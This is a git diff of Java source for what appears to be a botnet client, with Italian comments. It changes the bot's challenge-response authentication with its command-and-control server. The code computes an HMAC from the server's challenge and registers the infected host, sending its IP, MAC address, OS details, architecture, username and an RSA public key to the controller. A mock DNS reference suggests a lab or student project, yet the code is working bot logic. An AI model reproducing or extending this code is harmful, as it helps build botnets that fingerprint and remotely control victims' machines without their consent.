@@ -78,7 +78,6 @@ public class Behavior {
 	 */
 	public void initializeBot() {
 		// nServ.firstConnectToMockServerDns();
-		// TODO Se già ho un ID Controllo se sono gia iscritto e salto challenge
 		if (challengeToCommandConquer()) {
 			System.out.println("Bot Autenticazione riuscita");
 		} else
@@ -123,16 +122,20 @@ public class Behavior {
 			Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(),
 					nServ.getCommandConquerIps().get(0).getValue1());
 			if (challenge != null) {
-				String key = auth.generateStringKey(challenge.getValue2());
-				String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
-				System.out.println(hashMac);
-				String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(),
-						nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(),
-						nServ.getCommandConquerIps().get(0).getValue1(), hashMac, pki.getPubRSAKey(),
-						nServ.isElegible());
-				System.out.println("La risposta del C&C: " + response);
-				flag = false;
-				return true;
+				if (challenge.getValue2() != -1) {
+					String key = auth.generateStringKey(challenge.getValue2());
+					String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
+					System.out.println(hashMac);
+					String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(),
+							nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(),
+							nServ.getCommandConquerIps().get(0).getValue1(), hashMac, pki.getPubRSAKey(),
+							nServ.isElegible());
+					System.out.println("La risposta del C&C: " + response);
+					flag = false;
+					return true;
+				}else{
+					return true;
+				}
 			}
 		}
 		return false;
